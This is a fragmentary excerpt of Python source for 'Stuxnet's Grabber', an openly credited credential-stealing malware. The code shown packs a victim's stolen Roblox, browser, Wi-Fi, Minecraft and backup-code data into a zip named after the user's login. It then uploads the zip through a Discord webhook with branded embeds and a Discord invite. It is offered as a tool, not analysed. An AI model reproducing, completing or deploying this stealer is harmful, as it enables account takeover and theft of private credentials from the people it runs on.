...
def main(webhook: str):
    ...
    data = {
        "username": "Stuxnet",
        "avatar_url": "https://www.cherubavailabilityservices.com/wp-content/uploads/2019/06/CYBER-ATTACK-960x640.jpg"
    }

    _file = f'{localappdata}\\Stuxnet-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Stuxnet-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Stuxnet-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Stuxnet's Grabber | Created by who.is.kokontop"
                    },
                    "thumbnail": {
                        "url": "https://history-computer.com/wp-content/uploads/2022/07/Stuxnet-Virus.jpg"
                    }
                }
            ],
            "username": "Stuxnet",
                            ...
                            "embeds": [
                                {
                                    ...
                                    "footer": {
                                        "text": "Stuxnet's Grabber | Discord.gg/a9EvNuq9dv"
                                    },
                                }
                            ],
                            "username": "Stuxnet",
